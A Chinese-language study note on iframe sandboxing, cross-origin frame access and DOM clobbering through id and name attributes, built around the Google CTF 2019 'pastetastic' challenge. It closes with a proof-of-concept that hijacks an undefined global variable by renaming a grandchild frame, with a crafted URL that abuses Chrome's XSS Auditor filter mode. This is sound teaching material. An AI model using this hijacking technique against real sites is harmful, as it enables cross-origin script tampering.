### https://pastetastic.web.ctfcompetition.com/

### writeup
https://github.com/koczkatamas/gctf19/tree/master/pastetastic

##  iframe的sandbox属性

sandbox属性包括如下值，采用的是白名单，如果不设置sandbox属性，那即允许所有属性

```
allow-forms
allow-pointer-lock 
allow-popups
allow-same-origin
allow-scripts
allow-top-navigation
```

看下面一个例子体会一下差别：

```html
<iframe src="https://platform.twitter.com/widgets/tweet_button.html"
        style="border: 0; width:130px; height:20px;"></iframe>
```
此twitter分享功能可以正常使用。

但是如果加入限制如下：

```html
<iframe sandbox="allow-forms"
    src="https://platform.twitter.com/widgets/tweet_button.html"
    style="border: 0; width:130px; height:20px;"></iframe>
```

就会发生如下报错：

```
1. Blocked script execution in 'https://platform.twitter.com/widgets/tweet_button.html' because the document's frame is sandboxed and the 'allow-scripts' permission is not set.
2. tweet_button.html:1 Blocked opening 'https://twitter.com/share' in a new window because the request was made in a sandboxed frame whose 'allow-popups' permission is not set.
```

给一个空的sandbox属性，那么这个iframe所有能力都将被限制：

```
<iframe sandbox src="..."> 
```

### 各种限制能力的结束如下

1. allow-forms 允许表达表单提交
2. allow-pointer-lock  在iframe中可以锁定鼠标，主要和鼠标锁定有关
3. allow-popups  	允许iframe中弹出新窗口,比如,window.open,target="_blank"
4. allow-same-origin 允许将内容作为普通来源对待。如果未使用该关键字，嵌入的内容将被视为一个独立的源，和任何域都不同源。
5. allow-scripts 允许javascript的执行
6. allow-top-navigation  允许iframe能够主导window.top进行页面跳转

### allow-popups 的一个子选项 allow-popups-to-escape-sandbox 允许javascript执行

如下面例子

```html
<!-- No sandbox there... Popup window won't be sandboxed as well -->
<iframe id="red" src="iframe.html"></iframe>

<!-- This sandboxed frame will allow sandboxed popup window to open popups
     but not to execute JavaScript for instance. -->
<iframe id="green" src="iframe.html" sandbox="allow-popups"></iframe>

<!-- This sandboxed frame will create a clean non sandboxed popup window,
     allowed to execute JavaScript and open popups. -->
<iframe id="blue" src="iframe.html"
        sandbox="allow-popups allow-popups-to-escape-sandbox"></iframe>
```

```html
<!-- iframe.html -->

<p>I'm NOT allowed to execute JavaScript.</p>

<script>
  document.querySelector('p').textContent = "I can execute JavaScript.";
</script>

```
第一个和第三个的javascript可以执行成功。

### 沙箱的用途-安全的执行eval 

一个沙箱的例子: https://www.html5rocks.com/static/demos/evalbox/index.html

**localStorage** 受同源策略的影响。

下面是代码示例 

```html

<!-- frame.html -->
<!DOCTYPE html>
<html>
 <head>
   <title>Evalbox's Frame</title>
   <script>
     window.addEventListener('message', function (e) {
       var mainWindow = e.source;
       var result = '';
       try {
         result = eval(e.data);
       } catch (e) {
         result = 'eval() threw an exception.';
       }
       mainWindow.postMessage(result, event.origin);
     });
   </script>
 </head>
</html>

```

```html
<!-- index.html -->

<textarea id='code'></textarea>
<button id='safe'>eval() in a sandboxed frame.</button>
<iframe sandbox='allow-scripts'
        id='sandboxed'
        src='frame.html'></iframe>

<script>
    window.addEventListener('message',
    function (e) {
      // Sandboxed iframes which lack the 'allow-same-origin'
      // header have "null" rather than a valid origin. This means you still
      // have to be careful about accepting data via the messaging API you
      // create. Check that source, and validate those inputs!
      var frame = document.getElementById('sandboxed');
      if (e.origin === "null" && e.source === frame.contentWindow)
        alert('Result: ' + e.data);
    });

    function evaluate() {
  var frame = document.getElementById('sandboxed');
  var code = document.getElementById('code').value;
  // Note that we're sending the message to "*", rather than some specific
  // origin. Sandboxed iframes which lack the 'allow-same-origin' header
  // don't have an origin which you can target: you'll have to send to any
  // origin, which might alow some esoteric attacks. Validate your output!
  frame.contentWindow.postMessage(code, '*');
}

document.getElementById('safe').addEventListener('click', evaluate);

</script>
```

## iframe的父子关系

### 父页面访问子iframe

在不跨域的情况下，父页面获取子iframe页面的的内容主要是通过两个对象：

1. iframe.contentWindow  获取iframe的window对象
2. iframe.contentDocument  获取iframe的document对象

```javascript
iframe.contentWindow.document == iframe.contentDocument
```

具体的例子如下:

```javascript

var iframe = document.getElementById("iframe1");
var iwindow = iframe.contentWindow;
var idoc = iwindow.document;
console.log("window",iwindow);//获取iframe的window对象
console.log("document",idoc);  //获取iframe的document
console.log("html",idoc.documentElement);//获取iframe的html
console.log("head",idoc.head);  //获取head
console.log("body",idoc.body);  //获取body
```

还可以使用iframe的name属性，通过window提供的frames获取，直接获取的就是iframe的window对象。

```html
<iframe src ="/index.html" name="ifr1" scrolling="yes">
</iframe>
<script type="text/javascript">
	console.log(window.frames['ifr1'].window);
</script>
```

也可以利用iframe的索引位置来访问：

```html
<iframe src ="/index.html" name="ifr1" scrolling="yes">
</iframe>
<script type="text/javascript">
    iwindow = window.frames[0];
    idoc = iwindow.document;
    console.log(iwindow == document.getElementsByTagName('iframe').contentWindow); // true
</script>
```

甚至可以用下面的方法访问

```html

<iframe src ="/index.html" name="ifr1" scrolling="yes">
</iframe>
<script type="text/javascript">
    iwindow = window[0];
    idoc = iwindow.document;
    console.log(iwindow == document.getElementsByTagName('iframe')[0].contentWindow); // true
</script>

```

### 在iframe中获取父级内容

在同源下，父页面可以获取子iframe的内容，那么子iframe同样也能操作父页面内容。在iframe中，可以通过在window上挂载的几个API进行获取.


1. window.parent 获取上一级的window对象，如果还是iframe则是该iframe的window对象
2. window.top 获取最顶级容器的window对象，即，就是你打开页面的文档

### 在不同源情况下的访问

在跨域情况下，iframe的window对象大多数的与内容相关的属性都会被同源策略block掉，但是有两个属性比较特殊。

1. frames 可读，但是不可写。 意味着可以读取不同域的子页面里面的iframe的window对象
2. location 可写，但是不可读。意味着父子可以相互修改彼此的 location 

**结合以上两点可以推导出，爷可以修改孙(孙可以修改爷)的location。(父页面可以获取子页面的window对象，然后通过frames获取孙iframe的window对象，然后修改location)**

爷修改孙，演示如下：


```html
<!-- localhost:80/index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
    <iframe name="viewer" src="http://localhost:8888/view.html" onload="loaded(this)"></iframe>
    <script>
        // CONFIG = "test";
        function loaded(x) {
            myframe = window.frames[0];
            x.contentWindow.frames[0].location = "http://www.baidu.com/";    
            myframe.frames[0].location = 'http://www.baidu.com/';
            console.log(myframe == x.contentWindow);
        }
        // window.frames[0].location = 'http://www.baidu.com/';
    </script>
</body>

</html>
```

```html
<!-- localhost:8888/view.html -->

<iframe name="viewer" src="http://blog.wonderkun.cc/"></iframe>
```

#### 一个推导

域A.com的A页面用iframe加载了B.com的B页面,B.com的B页面又用iframe加载了A.com的C页面，A页面可以使用下面代码访问C页面

```javascript

window.frames[0].frames[0].document

```

### 一个变量劫持相关的漏洞

是googlectf 2019的一个考点 : [writeup](https://github.com/koczkatamas/gctf19/blob/master/pastetastic/README.md?1561956109549)

#### 重新审视一下 id 属性

我们知道在浏览器中有如下特点，我们定义的所有全局变量，都被存储在window对象中，作为window的属性来被访问的。

下面在console中验证一下：

```console
> content = "i am content storage in window";
< "i am content storage in window"
> window.content 
< "i am content storage in window"
> window.content == content
< true
```

同样，我们在页面中定义的具有id属性的dom对象也是作为全局变量存储在 window 中的。

```html
<h1 id="test"></h1>
```

然后再console里访问一下:

```console
> test
< <h1 id="test"></h1>
> window.test
< <h1 id="test"></h1>
```

这时候想到一个问题，既然 id 属性会被注册成全局变量，那么它会不会覆盖掉已经存在的全局变量呢？我们写如下的测试代码：

```html
<h1>test</h1>
<h2>test2</h2>

    <script>
        // CONFIG = "test";
        test = "ddd";
        document.getElementsByTagName("h1")[0].setAttribute('id',"test");
        document.getElementsByTagName("h2")[0].setAttribute('id',"test2");
    </script>
```

在console中输入：

```
> test
< "ddd"
> test2
> <h2 id="test2">test2</h2>
```

**事实证明无法覆盖已经定义的变量，但是却可以定义新的变量**

**怎么让页面中出现未定义的全局变量呢？别忘了 chrome 74之后 默认的 xss auditor 从block模式编程了filter模式，可以利用这个删除掉页面中的代码。**

另外我们知道，如果在页面中定义两个id一样的元素之后，这样使用 `document.getElementById` 就无法获取到这个id了，但是并不意味着着全局变量就不存在了，看下面这个实验。

```html
    <h1 id="test"></h1>
    <h2 id="test"></h2>
```

```console
> test 
< HTMLCollection(2) [h1#test, h2#test, test: h1#test]
   0: h1#test
   1: h2#test
   length: 2
   test: h1#test
   __proto__: HTMLCollection
```

很明显全局变量`test`还是存在的，是两个元素的数组。

#### 同样道理看一下iframe的name属性

```html
    <iframe  name="viewer" src="./view.html" onload="loaded(this)"></iframe>
```

在console里验证一下

```console
> viewer 
< Window {postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, parent: Window, …}
```
情况差不多，这里的 `viewer` 是注册在全局变量里的window对象。

但是如果页面中出现两个`name`相同的`iframe`，又会是什么情况呢？ 

```html
    <iframe name="test" src="http://B.com/B.html" ></iframe>
    <iframe name="test" src="http://C.com/C.html" ></iframe>
```

在console里面输入:

```
> test
< global {window: global, self: global, location: Location, closed: false, frames: global, …}
> test == document.getElementsByTagName('iframe')[0].contentWindow
< true
> test == document.getElementsByTagName('iframe')[1].contentWindow
< false
```

发现跟id的情况并不相同，这里只有第一个元素，而且仅有第一个元素。

#### id 和 name 重复出现时 

name在id前面

```html
    <iframe name="test" src="http://B.com/B.html" ></iframe>
    <h1 id="test"></h1>
```

```console
> test 
< global {window: global, self: global, location: Location, closed: false, frames: global, …}
```

id在name前面

```html
   <h1 id="test"></h1>
   <iframe name="test" src="http://B.com/B.html" ></iframe>
```

```console
> test 
< global {window: global, self: global, location: Location, closed: false, frames: global, …}
```

可以发现 name 的优先级是高于 id 的优先级的，无论怎样全局变量里存储的都是 iframe 的 window对象。

#### 利用场景 

我们有一个可以控制的域 A.com 中有页面 A.com/A.html , 用iframe加载了 B.com 的域的页面 B.com/B.html 。A.html无法操作B.html页面，因为是不同源的，同时 B.com/B.html页面用iframe加载了一个新的页面 C.com/C.html 。 

此时 B.com/B.html 存在一个未定义的全局变量 (可以是利用chrome的xss auditor的filter模式产生的)，怎么利用？场景用代码描述如下：


```html
<!-- A.com/A.html -->
<iframe  src="http://B.com/B.html" ></iframe>
```

```html
<!-- B.com/B.html -->
<iframe  src="http://C.com/C.html" ></iframe>
<h1 onclick="test()">click me</h1>
<script>
     VUL = "Hijack me";
</script>

<script>

    function test(){
        // 不能用alert ，alert 会尝试访问 VUL window对象的所有属性，会爆跨域错误
        console.log(VUL);
    }
</script>
```

利用的poc如下,修改A.html如下：

```html
<script>
    function loaded(x){
        x.contentWindow.frames[0].location = "http://A.com/index.html"; // 修改为跟A.com同源，这样在修改此iframe的name的时候就不会被同源策略block
        setTimeout(function() {
            console.log('setting viewer...');
            x.contentWindow.frames[0].name = "VUL"; // 重新定义全局变量
        },1000*1);
    }
</script>

<!--  
    http://B.com/B.html?xss=%3Cscript%3E%0A%20%20%20%20%20VUL%20=%20%22Hijack%20me%22;%0A%3C/script%3E
    利用chrome的filter模式去掉 VUL 的定义 
-->

<iframe  src="http://B.com/B.html?xss=%3Cscript%3E%0A%20%20%20%20%20VUL%20=%20%22Hijack%20me%22;%0A%3C/script%3E" onload="loaded(this)"></iframe>

```

